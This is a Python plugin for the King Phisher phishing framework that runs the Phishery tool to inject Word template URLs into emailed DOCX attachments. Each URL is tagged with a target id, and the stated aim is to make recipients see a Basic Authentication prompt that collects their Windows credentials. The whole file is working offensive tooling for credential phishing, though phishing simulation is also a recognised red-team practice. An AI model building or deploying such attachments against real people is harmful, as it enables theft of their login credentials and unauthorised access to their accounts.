import os
import subprocess
import tempfile
import time

import king_phisher.client.gui_utilities as gui_utilities
import king_phisher.client.mailer as mailer
import king_phisher.client.plugins as plugins

class Plugin(getattr(plugins, 'ClientPluginMailerAttachment', object)):
	authors = ['Spencer McIntyre']
	title = 'Phishery DOCX URL Injector'
	description = """
	Use Phishery to inject Word Document Template URLs into DOCX files. This can
	be used in conjunction with a server page that requries Basic Authentication
	to collect Windows credentials. Note that the King Phisher server needs to
	be configured with a proper, trusted SSL certificate for the user to be
	presented with the basic authentication prompt.

	Phishery homepage: https://github.com/ryhanson/phishery
	"""
	homepage = 'https://github.com/securestate/king-phisher-plugins'
	options = [
		plugins.ClientOptionPath(
			'phishery_bin',
			'Path to the phishery binary',
			default='/usr/local/bin/phishery',
			display_name='Phishery Path',
			path_type='file-open'
		)
	]
	req_min_version = '1.8.0b0'
	def initialize(self):
		mailer_tab = self.application.main_tabs['mailer']
		self.text_insert = mailer_tab.tabs['send_messages'].text_insert
		self.signal_connect('send-precheck', self.signal_send_precheck, gobject=mailer_tab)
		return True

	def process_attachment_file(self, input_path, output_path, target=None):
		if os.path.splitext(input_path)[1] != '.docx':
			return
		url = self.application.config['mailer.webserver_url']
		if target is not None:
			url += '?id=' + target.uid
		proc_h = subprocess.Popen(
			[
				self.config['phishery_bin'],
				'-u',
				url,
				'-i',
				input_path,
				'-o',
				output_path
			],
			stdin=subprocess.PIPE,
			stdout=subprocess.PIPE
		)
		status = proc_h.wait()
		if status != 0:
			raise RuntimeError('phishery exited with non-zero status code: ' + str(status))
		self.logger.info('wrote docx file to: ' + output_path + ('' if target is None else ' with uid: ' + target.uid))

	def signal_send_precheck(self, _):
		phishery_bin = self.config['phishery_bin']
		if not os.path.isfile(phishery_bin):
			self.text_insert('The path to the phishery bin is invalid (file not found).\n')
			return False
		if not os.access(phishery_bin, os.X_OK | os.R_OK):
			self.text_insert('The path to the phishery bin is invalid (invalid permissions).\n')
			return False
		return True
